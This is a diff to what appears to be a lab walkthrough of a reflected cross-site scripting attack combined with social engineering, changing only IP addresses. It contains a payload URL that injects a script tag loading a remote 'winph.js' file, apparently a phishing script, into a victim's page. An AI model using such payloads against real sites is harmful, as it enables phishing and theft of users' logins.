@@ -58,12 +58,12 @@
 3. [social engineering attack] victim user clicks link
 
     ```
-    http://192.168.5.13/rxss.php?q=<script src=http://192.168.5.13/winph.js></script>
+    http://192.168.5.15/rxss.php?q=<script src=http://192.168.5.15/winph.js></script>
     ```
 
     * **NOTES**:
-      * `192.168.5.13` - target site
-      * `192.168.5.13` - web server hosting payload
+      * `192.168.5.15` - target site
+      * `192.168.5.15` - web server hosting payload
 
 4. [social engineering attack] victim user authenticates
 
